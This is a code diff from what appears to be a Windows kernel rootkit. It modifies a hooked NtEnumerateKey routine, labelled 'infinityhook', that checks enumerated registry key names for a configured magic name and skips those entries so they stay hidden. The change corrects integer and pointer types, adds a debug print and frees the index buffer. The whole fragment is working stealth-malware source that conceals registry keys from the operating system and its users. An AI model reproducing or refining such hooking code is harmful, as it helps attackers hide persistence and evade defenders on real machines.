@@ -64,9 +64,18 @@ NTSTATUS DetourNtEnumerateKey(
 			// if the key contains 'hideme', return ANOTHER CALL of NtEnumerateKey
 			if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
 				kprintf("[+] infinityhook: Should hit RegistryKeyHideInformation\n");
-				INT32 HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
-				PINT32 OkSubkeyIndexesPtr = NULL;
-				NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, OkSubkeyIndexesPtr);
+				ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
+				PULONG OkSubkeyIndexesPtr = NULL;
+				NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, &OkSubkeyIndexesPtr);
+
+				if (!NT_SUCCESS(status)) {
+					// TODO - do something if this fails?
+				}
+
+				kprintf("Okkk indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
+
+				// !!! DO NOT FORGET TO FREE OkSubkeyIndexesPtr
+				ExFreePool(OkSubkeyIndexesPtr);
 
 				return OriginalNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength);
 			}
